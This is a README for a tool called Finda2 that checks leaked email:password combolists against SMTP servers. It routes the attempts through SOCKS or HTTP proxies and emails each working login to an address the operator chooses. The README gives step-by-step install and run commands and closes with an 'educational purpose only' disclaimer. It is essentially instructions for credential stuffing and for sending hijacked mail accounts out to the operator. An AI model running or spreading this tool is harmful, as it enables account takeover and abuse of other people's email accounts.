# Finda2
Find working smtp from combolist. list format email:pass.

install python https://www.python.org

on your command prompt. type cd into the finda foler and run the following command.

''' pip install -r requirement.txt '''

''' python finda.py combolist.txt -s sockfile.txt -p sock5 -e emailtogetlog@example.com '''

-s flag followed by a file name with proxies in the following format 0.0.0.0:80, it could be http, sock4 or sock5.

-p specify the proxy type.

-e the email address you would like to get working smtp logs. if finda finds a working smtp it will send a message using that smtp to specified email address.

#this tool is for educational purpose only. i will not be held responsible for how the public uses it.
